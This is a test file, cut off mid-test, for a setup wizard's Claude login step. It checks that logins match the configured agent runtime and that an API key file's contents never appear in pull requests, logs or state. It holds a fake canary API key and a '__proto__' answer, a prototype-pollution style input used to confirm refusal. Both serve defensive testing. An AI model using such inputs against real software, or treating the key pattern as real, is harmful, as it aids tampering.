// #738: the wizard's Claude step (local mode) matches the login to the project's agent_runtime, and offers an API
// key. A login the agents would refuse is not "done", and the step says why and how to fix it; the API-key choice
// makes the setup PR write agent_runtime.kind and records a key file's path, never the key; an existing project's
// agent_runtime is never rewritten. Against stand-ins (InitIo, a stand-in gh, a bare repo for GitHub) and, for the
// wizard-agrees-with-the-runner matrix, a fake `claude` first on PATH with a scratch HOME: never the real one.
//
// WHY only APIs that exist before #738 are imported: the fail-without run builds this file against the old engine.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { delimiter, dirname, join } from 'node:path';
import { BRAND } from '../src/brand.js';
import { emptyAutoConfig, SETUP_BRANCH } from '../src/auto-config.js';
import { loadConfig, loadConfigAt } from '../src/config/load.js';
import { localServiceSpec } from '../src/service.js';
import { initInstance } from '../src/instance.js';
import { doctor, setupChecks } from '../src/doctor.js';
import { projectStateDir } from '../src/guardrails/context.js';
import { firstRunLiveView, initCommand, localInitFile, newState, readInitState, setupContext, type InitArgs, type InitIo } from '../src/init.js';
import { CliRunner, type RunRequest } from '../src/runner.js';
import { checkSetup, checkSetupOffThread, MANAGER_LOGIN_VARS, systemProbe, type SetupProbe } from '../src/setup-steps.js';
import { serviceManagerEnv } from '../src/os/index.js';
import { exampleProject } from './helpers.js';

const posixOnly = process.platform === 'win32' && 'POSIX stand-ins and file modes';
process.env[`${BRAND.envPrefix}_STATE_DIR`] = mkdtempSync(join(tmpdir(), 'claude-runtime-state-'));

const REPO = 'example-org/example-shop';
const PASSES = 'node -e "process.exit(0)"';
const SUBSCRIPTION_DONE = 'signed in (claude.ai), per `claude auth status`; a minimal real call was answered';
const cfgOf = (root: string) => join(root, BRAND.configDir, 'config.yaml');

/** A new project: a repo whose origin is a bare repo standing in for GitHub (read as example-org/example-shop), no config. */
function newProject(): { root: string; bare: string } {
  const base = mkdtempSync(join(tmpdir(), 'cr-repo-'));
  const bare = join(base, 'github.com', 'example-org', 'example-shop.git');
  mkdirSync(dirname(bare), { recursive: true });
  const root = join(base, 'shop');
  mkdirSync(root);
  const git = (cwd: string, ...a: string[]) => execFileSync('git', a, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
  git(base, 'init', '-q', '--bare', '-b', 'main', bare);
  git(root, 'init', '-q', '-b', 'main');
  for (const [k, v] of [['user.email', 'ada@example.com'], ['user.name', 'Ada'], ['commit.gpgsign', 'false']] as const) git(root, 'config', k, v);
  writeFileSync(join(root, 'README.md'), 'shop\n');
  git(root, 'add', '--', '.');
  git(root, 'commit', '-q', '-m', 'init');
  git(root, 'remote', 'add', 'origin', bare);
  git(root, 'push', '-q', 'origin', 'main');
  return { root, bare };
}

/** An existing project: the example's committed config (agent_runtime.kind as given), with a GitHub origin and a CI check named. */
function existingProject(kind: 'cli' | 'api_key' = 'cli'): string {
  const { dir } = exampleProject();
  const f = cfgOf(dir);
  writeFileSync(f, `${readFileSync(f, 'utf8').replace(/^(\s+kind:\s*)cli\b/m, `$1${kind}`)}\nrequired_checks: [test]\n`);
  for (const a of [['-c', 'user.email=ada@example.com', '-c', 'user.name=Ada', '-c', 'commit.gpgsign=false', 'commit', '-q', '-am', 'config'], ['remote', 'add', 'origin', `https://github.com/${REPO}.git`]]) execFileSync('git', a, { cwd: dir });
  return dir;
}

/** A key file this user owns, open to no one else, holding a canary key (a fixture: never a real key). */
function keyFile(): { file: string; canary: string } {
  const dir = mkdtempSync(join(tmpdir(), 'cr-key-'));
  const file = join(dir, 'anthropic-key');
  const canary = `sk-ant-api03-CANARY${'q'.repeat(40)}738`;
  writeFileSync(file, `${canary}\n`, { mode: 0o600 });
  chmodSync(file, 0o600);
  return { file, canary };
}

/**
 * A world of stand-ins for init: tools present, `claude auth status` reporting `method` (null: signed out), the
 * login's proof answered, gh signed in with push, and a stand-in gh for auto-config's calls, recorded.
 */
function world(o: { method: string | null; ask?: string[]; manager?: { env: Record<string, string> } | { error: string } }) {
  const w = { method: o.method };
  const said: string[] = [];
  const gh: string[][] = [];
  const asked: string[] = [];
  const answers = [...(o.ask ?? [])];
  const claudeCalls: { args: string[]; opt: unknown }[] = [];
  const io: InitIo = {
    which: (c) => (['git', 'gitleaks', 'claude', 'gh'].includes(c) ? `/stand-in/${c}` : null),
    serviceManagerEnv: () => o.manager ?? { env: {} },
    run: (cmd, args, opt = {}) => {
      const cwd = (opt as { cwd?: string }).cwd;
      if (cmd === 'git') {
        const r = spawnSync('git', args, { encoding: 'utf8', ...(cwd ? { cwd } : {}) });
        return { status: r.status, stdout: r.stdout, stderr: r.stderr };
      }
      const a = args.join(' ');
      if (cmd === 'claude') claudeCalls.push({ args, opt });
      if (cmd === 'claude' && args[0] === '-p') return { status: 0, stdout: '{"type":"result","subtype":"success","is_error":false,"result":"ok"}', stderr: '' };
      if (cmd === 'claude' && a === 'auth status') return w.method ? { status: 0, stdout: JSON.stringify({ loggedIn: true, authMethod: w.method }), stderr: '' } : { status: 1, stdout: '{"loggedIn": false}', stderr: '' };
      if (cmd === 'gh') {
        gh.push(args);
        if (a === 'auth status') return { status: 0, stdout: '', stderr: '' };
        if (a.endsWith('--jq .permissions.push')) return { status: 0, stdout: 'true\n', stderr: '' };
        if (a.endsWith('/protection --silent')) return { status: 1, stdout: '', stderr: 'gh: Branch not protected (HTTP 404)' };
        if (a.startsWith('repo view')) return { status: 0, stdout: 'main\n', stderr: '' };
        if (a.startsWith('api user')) return { status: 0, stdout: 'ada\n', stderr: '' };
        if (a.startsWith('pr list')) return { status: 0, stdout: '', stderr: '' };
        if (a.startsWith('pr create')) return { status: 0, stdout: `https://github.com/${REPO}/pull/7\n`, stderr: '' };
        if (a.startsWith('pr view')) return { status: 0, stdout: 'OPEN\n', stderr: '' };
      }
      return { status: 1, stdout: '', stderr: `no stand-in for ${cmd} ${a}` };
    },
    interactive: async () => 0,
    ask: async (q) => {
      asked.push(q);
      return answers.length ? answers.shift()! : null;
    },
    say: (l) => said.push(l),
    download: async () => undefined,
    plan: () => null,
    addProject: async () => ({ code: 1, steps: {}, last: '' }),
  };
  const probe: SetupProbe = { which: io.which, run: io.run, serviceRunning: () => false, systemUnitActive: () => false, linger: () => null, serviceManagerEnv: io.serviceManagerEnv };
  const prefix = mkdtempSync(join(tmpdir(), 'cr-prefix-'));
  const args = (root: string, a: Partial<InitArgs> = {}): InitArgs => ({ target: root, mode: 'local', instance: undefined, yes: false, reset: false, cwd: root, prefix, interactive: false, ...a });
  const runtimes = () => claudeCalls.map((c) => (c.opt as { agentRuntime?: string } | undefined)?.agentRuntime);
  return { w, io, probe, said, gh, asked, claudeCalls, runtimes, args, out: () => said.join('\n') };
}

const claudeStep = (root: string) => readInitState(localInitFile(root))!.steps.claude!;

test('#738 acceptance 1: kind cli and a login claude reports as an API key: the step is not done, says the agents would refuse it, and how to fix it', async () => {
  for (const method of ['api_key', 'api_key_helper']) {
    // A new project (the template's kind: cli) and an existing one (its config says cli).
    for (const [what, root] of [['new', newProject().root], ['existing', existingProject('cli')]] as const) {
      const t = world({ method });
      assert.equal(await initCommand(t.args(root), t.io), 1, t.out());
      const s = claudeStep(root);
      assert.equal(s.status, 'failed', `${method}, ${what}: ${s.detail}`);
      assert.match(s.detail, new RegExp(`signed in \\(${method}\\), per \`claude auth status\`, but the agents would refuse it: agent_runtime\\.kind is cli`), what);
      assert.match(s.detail, /runs only on a Claude subscription login \(claude\.ai or oauth_token\), so every run would stop with auth_mismatch/);
      assert.match(s.detail, /To fix: sign in with your Claude subscription \(`claude auth login`\)/);
      if (what === 'new') assert.match(s.detail, /or choose an API key: `worklane init --answer agent-runtime=api_key --answer api-key-file=<path of a file holding the key>`/);
      else assert.match(s.detail, /\(\.worklane\/config\.yaml\)[\s\S]*or change agent_runtime\.kind to api_key in \.worklane\/config\.yaml through a reviewed PR/);
      // Fail closed: no paid proof call for a login the agents would refuse, and nothing after the step ran.
      assert.ok(!t.claudeCalls.some((c) => c.args[0] === '-p'), 'no real call made for a refused login');
      assert.ok(!t.gh.some((a) => a[0] === 'pr'), 'no PR proposed');
    }
  }
  // The same on doctor's and the first-run page's copy of the step (one registry): not done, saying why.
  const root = existingProject('cli');
  const t = world({ method: 'api_key' });
  const view = checkSetup(setupContext(null, { mode: 'local', root, repo: REPO, instance: null, stateDir: projectStateDir(root), policyFile: null }), t.probe);
  const step = view.groups.flatMap((g) => g.steps).find((s) => s.id === 'claude-login')!;
  assert.equal(step.done, false, step.detail);
  assert.match(step.detail, /the agents would refuse it/);
  await initCommand(t.args(root), t.io);
  const line = doctor(root, { initIo: t.io }).find((c) => c.name === 'setup step claude-login')!;
  assert.equal(line.level, 'warn');
  assert.match(line.detail, /the agents would refuse it/);
});

test('#738 acceptance 2: kind cli and a subscription login: the step is done, as today, and asked as the agents ask', async () => {
  const root = existingProject('cli');
  const t = world({ method: 'claude.ai' });
  assert.equal(await initCommand(t.args(root), t.io), 0, t.out());
  const s = claudeStep(root);
  assert.equal(s.status, 'done');
  assert.equal(s.detail, SUBSCRIPTION_DONE, 'the same words as before #738');
  assert.ok(existsSync(cfgOf(root)));
  // Every claude call the step made ran with the agents' own environment for the runtime (src/runner.ts agentAuthEnv).
  assert.deepEqual([...new Set(t.claudeCalls.map((c) => c.args[0]))].sort(), ['-p', 'auth'], 'auth status and the proof');
  assert.ok(t.runtimes().every((r) => r === 'cli'), JSON.stringify(t.claudeCalls));
});

test('#738 acceptance 3: choosing "API key" makes the setup PR write agent_runtime.kind: api_key, and a matching login then passes the step', async () => {
  const p = newProject();
  const k = keyFile();
  const t = world({ method: 'api_key_helper' });
  // Before choosing: the template's kind is cli, so this login is refused, saying how to choose an API key.
  assert.equal(await initCommand(t.args(p.root), t.io), 1);
  assert.match(claudeStep(p.root).detail, /agent_runtime\.kind is cli \(a new project's default\)[\s\S]*choose an API key/);
  // Chosen (on the command line): the login now matches, the walk goes on, and the setup PR carries the kind.
  const answers = { 'agent-runtime': 'api_key', 'api-key-file': k.file, 'no-test-command': `custom:${PASSES}`, 'one-test-file': 'none' };
  assert.equal(await initCommand(t.args(p.root, { answers }), t.io), 1, t.out());
  const st = readInitState(localInitFile(p.root))!;
  assert.equal(st.steps.claude!.status, 'done', st.steps.claude!.detail);
  assert.match(st.steps.claude!.detail, /^signed in \(api_key_helper\), per `claude auth status`; a minimal real call was answered$/);
  assert.match(st.steps['repo-config']!.detail, /proposed in PR #7/, st.steps['repo-config']!.detail);
  execFileSync('git', ['fetch', '-q', 'origin', SETUP_BRANCH], { cwd: p.root });
  const cfg = loadConfigAt(p.root, `origin/${SETUP_BRANCH}`);
  assert.equal(cfg.project.agent_runtime.kind, 'api_key', 'the setup PR sets the chosen kind');
  const diff = execFileSync('git', ['diff', `origin/main`, `origin/${SETUP_BRANCH}`, '--', `${BRAND.configDir}/config.yaml`], { cwd: p.root, encoding: 'utf8' });
  assert.match(diff, /^\+ {2}kind: api_key {13}# api_key:/m);
  assert.ok(!diff.includes(k.file), "the key file's path is this machine's: never in the PR");
  // The first-run page and doctor check the same login against the same choice: done.
  const live = await firstRunLiveView(localInitFile(p.root), { root: p.root, repo: REPO, instance: null, live: { probe: t.probe, stateDir: projectStateDir(p.root), policyFile: null } });
  assert.equal(live.setup!.groups.flatMap((g) => g.steps).find((s) => s.id === 'claude-login')!.done, true);
  // A subscription login against the API-key choice: refused, saying how to point claude at the chosen file.
  const sub = world({ method: 'claude.ai' });
  assert.equal(await initCommand(sub.args(p.root), sub.io), 1);
  assert.match(claudeStep(p.root).detail, new RegExp(`agent_runtime\\.kind is api_key \\(your choice in init, for the setup PR\\)[\\s\\S]*set "apiKeyHelper": "cat -- ${k.file.replace(/[.*+?^${}()|[\]\\/]/g, '\\$&')}" in your Claude settings`));

  // On the terminal: 2, then the path. Recorded the same way; the key itself is never asked for.
  const q = newProject();
  const k2 = keyFile();
  const tty = world({ method: 'api_key', ask: ['2', k2.file] });
  assert.equal(await initCommand(tty.args(q.root, { interactive: true }), tty.io), 1);
  assert.deepEqual(readInitState(localInitFile(q.root))!.agentRuntime, { kind: 'api_key', keyFile: k2.file });
  assert.equal(claudeStep(q.root).status, 'done', claudeStep(q.root).detail);
  assert.ok(tty.asked.some((a) => /the path of the file that holds the key \(the path, not the key\)/.test(a)), tty.asked.join('\n'));
  assert.match(tty.out(), /1\) {2}your Claude subscription[\s\S]*2\) {2}an API key, in a file you own \(only its path is asked for\)/);
});

test('#738 acceptance 3: a key file that could leak is refused, and a key given where a path belongs is never echoed or kept', { skip: posixOnly }, async () => {
  const p = newProject();
  const k = keyFile();
  const t = world({ method: 'api_key_helper' });
  const run = async (file: string) => {
    await initCommand(t.args(p.root, { answers: { 'agent-runtime': 'api_key', 'api-key-file': file } }), t.io);
    return readInitState(localInitFile(p.root))!;
  };
  chmodSync(k.file, 0o640);
  const open = await run(k.file);
  assert.equal(open.steps.claude!.status, 'failed');
  assert.match(open.steps.claude!.detail, /is open to others \(mode 0640\): run `chmod 600/);
  assert.equal(open.agentRuntime, undefined, 'nothing recorded');
  assert.match((await run(join(dirname(k.file), 'missing'))).steps.claude!.detail, /no file at /);
  assert.match((await run(dirname(k.file))).steps.claude!.detail, /is not a regular file/);
  // A symlink to a file others can read is judged by that file, not the link.
  const open2 = keyFile();
  chmodSync(open2.file, 0o644);
  const link = join(dirname(k.file), 'link-to-open-key');
  symlinkSync(open2.file, link);
  assert.match((await run(link)).steps.claude!.detail, /is open to others \(mode 0644\)/);
  // An answer that names no kind (an object's own key included) is refused, never read as a choice.
  await initCommand(t.args(p.root, { answers: { 'agent-runtime': '__proto__' } }), t.io);
  assert.match(readInitState(localInitFile(p.root))!.steps.claude!.detail, /--answer agent-runtime= takes subscription or api_key/);
  // The key itself, given as the "path": refused without showing it, and kept nowhere.
  const pasted = await run(k.canary);
  assert.match(pasted.steps.claude!.detail, /what was given is not shown, in case it was the key itself/);
  assert.ok(!JSON.stringify(pasted).includes(k.canary), 'not in init state');
  assert.ok(!t.out().includes(k.canary), 'not in what init printed');
});

/** Every file under `dir` (recursively) whose content holds `needle`, but `except`. */
function filesHolding(dir: string, needle: string, except: string[] = []): string[] {
  const hits: string[] = [];
  const walk = (d: string) => {
    for (const e of readdirSync(d, { withFileTypes: true })) {
      const f = join(d, e.name);
      if (except.includes(f)) continue;
      if (e.isDirectory()) walk(f);
      else if (e.isFile() && statSync(f).size < 50_000_000 && readFileSync(f).includes(needle)) hits.push(f);
    }
  };
  if (existsSync(dir)) walk(dir);
  return hits;
}

test("#738 acceptance 4: the chosen key file's contents appear in no setup PR, event, log or response; only its path is recorded", async () => {
  const p = newProject();
  const k = keyFile();
  const t = world({ method: 'api_key_helper' });
  const answers = { 'agent-runtime': 'api_key', 'api-key-file': k.file, 'no-test-command': `custom:${PASSES}`, 'one-test-file': 'none' };
  await initCommand(t.args(p.root, { answers }), t.io);
  const state = readInitState(localInitFile(p.root))!;
  assert.deepEqual(state.agentRuntime, { kind: 'api_key', keyFile: k.file }, 'the path is recorded, in init state (this machine only)');
  assert.match(state.steps['repo-config']!.detail, /proposed in PR #7/);
  // The PR: its title, body and every gh call; and every file on the pushed setup branch.
  assert.ok(t.gh.some((a) => a[0] === 'pr' && a[1] === 'create'));
  assert.ok(!JSON.stringify(t.gh).includes(k.canary), 'not in any gh call (the PR title and body)');
  execFileSync('git', ['fetch', '-q', 'origin', SETUP_BRANCH], { cwd: p.root });
  const grep = spawnSync('git', ['grep', '-I', '-c', '-F', k.canary, `origin/${SETUP_BRANCH}`], { cwd: p.root, encoding: 'utf8' });
  assert.deepEqual([grep.status, grep.stdout], [1, ''], 'not in any file of the setup PR (git grep: no match)');
  const log = execFileSync('git', ['log', '--format=%B', `origin/main..origin/${SETUP_BRANCH}`], { cwd: p.root, encoding: 'utf8' });
  assert.ok(log.trim() && !log.includes(k.canary), 'nor in its commit message');
  // The log (what init printed), the first-run page's response and doctor's lines.
  assert.ok(!t.out().includes(k.canary), 'not in what init printed');
  const live = await firstRunLiveView(localInitFile(p.root), { root: p.root, repo: REPO, instance: null, live: { probe: t.probe, stateDir: projectStateDir(p.root), policyFile: null } });
  assert.ok(!JSON.stringify(live).includes(k.canary), 'not in the first-run response');
  assert.ok(!JSON.stringify(doctor(p.root, { initIo: t.io })).includes(k.canary), "not in doctor's lines");
  // Events and every other machine-local record: the project's state dir, the engine's state dir, and the checkout.
  const roots = [projectStateDir(p.root), process.env[`${BRAND.envPrefix}_STATE_DIR`]!, p.root];
  for (const r of roots) assert.deepEqual(filesHolding(r, k.canary), [], `nothing under ${r} holds the key`);
  // The scan itself finds a planted copy (so an empty result means something).
  writeFileSync(join(projectStateDir(p.root), 'planted.txt'), k.canary);
  assert.equal(filesHolding(projectStateDir(p.root), k.canary).length, 1);
});

test("#738 acceptance 5: re-running the wizard leaves an existing project's agent_runtime as it is, whatever is chosen", async () => {
  const k = keyFile();
  // kind cli, an API-key login, and the API key chosen again on the command line: the step says the config decides.
  const root = existingProject('cli');
  const before = readFileSync(cfgOf(root), 'utf8');
  const t = world({ method: 'api_key_helper' });
  assert.equal(await initCommand(t.args(root, { answers: { 'agent-runtime': 'api_key', 'api-key-file': k.file } }), t.io), 1, t.out());
  assert.equal(readFileSync(cfgOf(root), 'utf8'), before, 'config.yaml unchanged');
  assert.equal(execFileSync('git', ['status', '--porcelain', '--', BRAND.configDir], { cwd: root, encoding: 'utf8' }), '', 'nothing to commit there');
  assert.ok(!t.gh.some((a) => a[0] === 'pr'), 'no PR proposed');
  assert.equal(readInitState(localInitFile(root))!.agentRuntime, undefined, 'the choice is not kept for a project that has its config');
  assert.match(t.out(), /--answer agent-runtime: left as it is: this project's \.worklane\/config\.yaml sets agent_runtime already/);
  assert.match(claudeStep(root).detail, /agent_runtime\.kind is cli \(\.worklane\/config\.yaml\)/);
  // An existing API-key project: its matching login passes, and a re-run leaves it as it is.
  const keyed = existingProject('api_key');
  const kb = readFileSync(cfgOf(keyed), 'utf8');
  const ok = world({ method: 'api_key_helper' });
  assert.equal(await initCommand(ok.args(keyed, { answers: { 'agent-runtime': 'subscription' } }), ok.io), 0, ok.out());
  assert.equal(claudeStep(keyed).status, 'done');
  assert.equal(readFileSync(cfgOf(keyed), 'utf8'), kb);
  assert.ok(ok.runtimes().length > 0 && ok.runtimes().every((r) => r === 'api_key'), JSON.stringify(ok.claudeCalls));
});

test('#738: a held draft (the first-run page) decides the kind before the config is in the checkout, even against the choice', () => {
  const p = newProject();
  const exampleCfg = readFileSync(cfgOf(exampleProject().dir), 'utf8');
  const state = newState('local', p.root, REPO, null);
  state.autoConfig = { ...emptyAutoConfig(), draft: { branch: 'main', base: '0'.repeat(40), owner: 'ada', yaml: { 'config.yaml': exampleCfg.replace(/^(\s+kind:\s*)cli\b/m, '$1api_key') }, body: '', at: new Date().toISOString() } };
  const stepFor = (method: string) => {
    const t = world({ method });
    const view = checkSetup(setupContext(state, { mode: 'local', root: p.root, repo: REPO, instance: null, stateDir: projectStateDir(p.root), policyFile: null }), t.probe);
    return view.groups.flatMap((g) => g.steps).find((s) => s.id === 'claude-login')!;
  };
  assert.equal(stepFor('api_key_helper').done, true, stepFor('api_key_helper').detail);
  const sub = stepFor('claude.ai');
  assert.equal(sub.done, false, sub.detail);
  assert.match(sub.detail, /agent_runtime\.kind is api_key \(the drafted config\)[\s\S]*or set agent_runtime\.kind to cli in the draft's config\.yaml on the first-run page/);
});

test("#738 round 2: an API-key project's card offers the apiKeyHelper line, never a subscription Sign in; a subscription project keeps Sign in", () => {
  const p = newProject();
  const k = keyFile();
  const state = newState('local', p.root, REPO, null);
  state.agentRuntime = { kind: 'api_key', keyFile: k.file } as never;
  const card = (s: typeof state | null, method: string) => {
    const view = checkSetup(setupContext(s, { mode: 'local', root: p.root, repo: REPO, instance: null, stateDir: projectStateDir(p.root), policyFile: null }), world({ method }).probe);
    return view.groups.flatMap((g) => g.steps).find((x) => x.id === 'claude-login')!;
  };
  for (const method of ['claude.ai', 'api_key_helper']) {
    const c = card(state, method);
    assert.equal(c.fix.kind, 'terminal', `${method}: ${JSON.stringify(c.fix)}`);
    assert.equal((c.fix as { command: string }).command, `"apiKeyHelper": "cat -- ${k.file}"`);
  }
  assert.equal(card(null, 'claude.ai').fix.kind, 'signin', 'a subscription project: Sign in, as before');
  assert.equal(card(null, 'api_key').fix.kind, 'signin');
});

test('#738 round 2: server mode, the recorded login of the agent user must be one the instance runs on (agent_api_key: an API key)', () => {
  const machine = mkdtempSync(join(tmpdir(), 'cr-machine-'));
  const accountDir = join(machine, 'claude-account');
  mkdirSync(accountDir);
  const root = existingProject('cli');
  const home = mkdtempSync(join(tmpdir(), 'cr-inst-'));
  const keyed = { home, credentials: { github: { kind: 'app' as const, key_path: join(home, 'app.pem') }, agent_api_key: join(home, 'key') } };
  const plain = { home, credentials: { github: { kind: 'app' as const, key_path: join(home, 'app.pem') } } };
  const step = (method: string | null, facts: typeof keyed | typeof plain) => {
    const agent = { instance: 'shop', kind: 'agent', user: 'wl-shop-agent', stored: true, logged_in: true, ...(method ? { auth_method: method } : {}), token_id: '0123abcd' };
    writeFileSync(join(accountDir, 'status.json'), JSON.stringify({ at: '2026-10-19T10:00:00Z', users: [agent] }));
    const ctx = { ...setupContext(null, { mode: 'server', root, repo: REPO, instance: 'shop', stateDir: projectStateDir(root), policyFile: null }), machine: { claudeAccountDir: accountDir }, instanceFacts: () => facts };
    return checkSetup(ctx, world({ method: null }).probe).groups.flatMap((g) => g.steps).find((s) => s.id === 'claude-token')!;
  };
  const refused = step('claude.ai', keyed);
  assert.equal(refused.done, false, refused.detail);
  assert.match(refused.detail, /but the agents would refuse it: the instance runs on an API key \(credentials\.yaml agent_api_key\), which takes only api_key or api_key_helper/);
  assert.equal(step('api_key_helper', keyed).done, true);
  assert.equal(step('api_key_helper', plain).done, false, 'a subscription instance refuses an API-key login');
  assert.equal(step(null, plain).done, false, 'a record that names no method: not done');
  const same = step('claude.ai', plain);
  assert.equal(same.done, true, same.detail);
  assert.equal(same.detail, 'wl-shop-agent is signed in (claude.ai), per claude auth status as that user at 2026-10-19T10:00:00Z; token 0123abcd', 'a matching login reads as before');
});

/** Run `fn` with this process's environment set to `env` (PATH, HOME, ...), every login variable cleared first; restored after. */
function withEnv<T>(env: NodeJS.ProcessEnv, fn: () => T): T {
  const saved = { ...process.env };
  try {
    for (const k of Object.keys(process.env)) if (/^(ANTHROPIC_|CLAUDE_CODE_OAUTH_TOKEN$|CLAUDE_CONFIG_DIR$)/.test(k)) delete process.env[k];
    Object.assign(process.env, env);
    return fn();
  } finally {
    for (const k of Object.keys(process.env)) if (!(k in saved)) delete process.env[k];
    Object.assign(process.env, saved);
  }
}

/** What the OS adapter reads from a user manager with no bus (a stand-in `run`; never the real systemctl). */
const managerDown = () =>
  serviceManagerEnv(MANAGER_LOGIN_VARS, {
    platform: 'linux',
    run: () => {
      throw Object.assign(new Error('Command failed'), { stderr: 'Failed to connect to bus: No medium found\n' });
    },
  });

test("#738: when the user service manager can't be read, the step is not done, says why, and its fix is the check that shows why: never Sign in", () => {
  // A subscription project, and an API-key project (init's choice): neither gets Sign in, which can't fix this.
  const cli = existingProject('cli');
  const keyed = newProject();
  const state = newState('local', keyed.root, REPO, null);
  state.agentRuntime = { kind: 'api_key', keyFile: keyFile().file } as never;
  for (const [what, root, s] of [['subscription', cli, null], ['API key', keyed.root, state]] as const) {
    const t = world({ method: 'claude.ai', manager: managerDown() });
    const step = checkSetup(setupContext(s, { mode: 'local', root, repo: REPO, instance: null, stateDir: projectStateDir(root), policyFile: null }), t.probe).groups.flatMap((g) => g.steps).find((x) => x.id === 'claude-login')!;
    assert.equal(step.done, false, `${what}: ${step.detail}`);
    assert.match(step.detail, /can't tell which login the coordinator's service gets: its service manager can't be read \(systemctl --user show-environment failed: Failed to connect to bus: No medium found\)/);
    assert.deepEqual(step.fix, { kind: 'terminal', command: process.platform === 'darwin' ? 'launchctl getenv CLAUDE_CONFIG_DIR' : 'systemctl --user show-environment', why: "this user's service manager couldn't be read; this shows why" }, `${what}: ${JSON.stringify(step.fix)}`);
    assert.ok(!t.claudeCalls.some((c) => c.args[0] === '-p'), `${what}: no real call made`);
  }
});

test('#738: a test process never reaches this machine\'s service manager: a recording systemctl first on PATH sees no call from any entry point', { skip: posixOnly }, async () => {
  const dir = mkdtempSync(join(tmpdir(), 'cr-recording-'));
  const record = join(dir, 'calls.log');
  writeFileSync(record, '');
  writeFileSync(join(dir, 'systemctl'), `#!/bin/sh\necho "$*" >> ${JSON.stringify(record)}\nexit 1\n`);
  chmodSync(join(dir, 'systemctl'), 0o755);
  const root = existingProject('cli');
  const ctx = setupContext(null, { mode: 'local', root, repo: REPO, instance: null, stateDir: projectStateDir(root), policyFile: null });
  const env = { PATH: [dir, dirname(process.execPath), '/usr/bin', '/bin'].join(delimiter) };
  // The OS adapter itself, the real probe, doctor (with a stand-in io and without), and the dashboard's worker.
  const direct = withEnv(env, () => serviceManagerEnv(MANAGER_LOGIN_VARS));
  assert.ok('error' in direct && /a test run never reads this machine's user service manager/.test(direct.error), JSON.stringify(direct));
  const step = withEnv(env, () => checkSetup(ctx, systemProbe()).groups.flatMap((g) => g.steps).find((x) => x.id === 'claude-login')!);
  assert.equal(step.done, false, 'unknown fails closed');
  withEnv(env, () => setupChecks(root, { mode: 'local', initIo: world({ method: 'claude.ai' }).io }));
  withEnv(env, () => setupChecks(root, { mode: 'local' }));
  const saved = process.env.PATH;
  process.env.PATH = env.PATH;
  try {
    await checkSetupOffThread(ctx, { cache: new Map() });
  } finally {
    process.env.PATH = saved;
  }
  assert.equal(readFileSync(record, 'utf8'), '', 'no systemctl call of any kind');
});

test('#738 round 3: server mode while the setup PR waits (the checkout has no valid config): a matching record reads as on main, read from credentials.yaml alone', () => {
  const dir = mkdtempSync(join(tmpdir(), 'cr-instances-'));
  const p = newProject();
  initInstance('gamma', p.root, REPO, dir, 'wl-gamma-agent', '/home/example');
  const accountDir = join(mkdtempSync(join(tmpdir(), 'cr-machine-')), 'claude-account');
  mkdirSync(accountDir);
  const step = (method: string) => {
    writeFileSync(join(accountDir, 'status.json'), JSON.stringify({ at: '2026-10-19T10:00:00Z', users: [{ instance: 'gamma', kind: 'agent', user: 'wl-gamma-agent', stored: true, logged_in: true, auth_method: method, token_id: '0123abcd' }] }));
    const ctx = { ...setupContext(null, { mode: 'server', root: p.root, repo: REPO, instance: 'gamma', stateDir: projectStateDir(p.root), policyFile: null }), machine: { claudeAccountDir: accountDir } };
    return withEnv({ [`${BRAND.envPrefix}_INSTANCES_DIR`]: dir }, () => checkSetup(ctx, world({ method: null }).probe).groups.flatMap((g) => g.steps).find((s) => s.id === 'claude-token')!);
  };
  const ok = step('claude.ai');
  assert.equal(ok.done, true, ok.detail);
  assert.equal(ok.detail, 'wl-gamma-agent is signed in (claude.ai), per claude auth status as that user at 2026-10-19T10:00:00Z; token 0123abcd', "main's words");
  assert.equal(step('api_key_helper').done, false, 'a subscription instance (no agent_api_key) refuses an API-key login');
  // An API-key instance: credentials.yaml names agent_api_key; still no valid repo config.
  const creds = join(dir, 'gamma', 'credentials.yaml');
  writeFileSync(creds, `${readFileSync(creds, 'utf8')}agent_api_key: ${JSON.stringify(join(dir, 'gamma', 'agent-key'))}\n`);
  assert.equal(step('api_key_helper').done, true, step('api_key_helper').detail);
  assert.match(step('claude.ai').detail, /the instance runs on an API key \(credentials\.yaml agent_api_key\)/);
});

test("#738, the owner's option (a): a server with no claude-account record keeps main's verdict, and doctor warns that the login method can't be checked", () => {
  const accountDir = join(mkdtempSync(join(tmpdir(), 'cr-machine-')), 'claude-account');
  const cfgDir = mkdtempSync(join(tmpdir(), 'cr-agent-claude-'));
  const facts = { home: mkdtempSync(join(tmpdir(), 'cr-inst-')), credentials: { github: { kind: 'app' as const, key_path: '/nowhere/app.pem' }, claude: { config_dir: cfgDir } } };
  const root = existingProject('cli');
  const scratch = { [`${BRAND.envPrefix}_MACHINE_INIT_DIR`]: mkdtempSync(join(tmpdir(), 'cr-init-')), [`${BRAND.envPrefix}_INSTANCES_DIR`]: mkdtempSync(join(tmpdir(), 'cr-instances-')) };
  const lines = () => withEnv(scratch, () => setupChecks(root, { mode: 'server', instance: 'shop', initIo: world({ method: null }).io, context: { machine: { claudeAccountDir: accountDir, engine: '/opt/engine/current' }, instanceFacts: () => facts } }));
  const named = (ls: ReturnType<typeof lines>, name: string) => ls.find((l) => l.name === name);
  // No record: the step as on main (done, the stored login), and doctor's warning with the root command.
  const none = lines();
  assert.deepEqual([named(none, 'setup step claude-token')?.level, named(none, 'setup step claude-token')?.detail], ['ok', `The agents' Claude login (server mode): the agents' Claude login is stored (${cfgDir})`]);
  assert.deepEqual(named(none, 'setup claude-account record'), { name: 'setup claude-account record', level: 'warn', detail: "no Claude account recorded for shop; the setup step can't check its login method. As root: sudo bash /opt/engine/current/scripts/setup/claude-account.sh status shop" });
  // A record for this instance's agent user: no warning, and its method is checked.
  mkdirSync(accountDir, { recursive: true });
  writeFileSync(join(accountDir, 'status.json'), JSON.stringify({ at: '2026-10-19T10:00:00Z', users: [{ instance: 'shop', kind: 'agent', user: 'wl-shop-agent', stored: true, logged_in: true, auth_method: 'claude.ai', token_id: '0123abcd' }] }));
  const recorded = lines();
  assert.equal(named(recorded, 'setup claude-account record'), undefined);
  assert.equal(named(recorded, 'setup step claude-token')?.level, 'ok');
  // Another instance's record, or the eval user's, is not this one's: the warning stays.
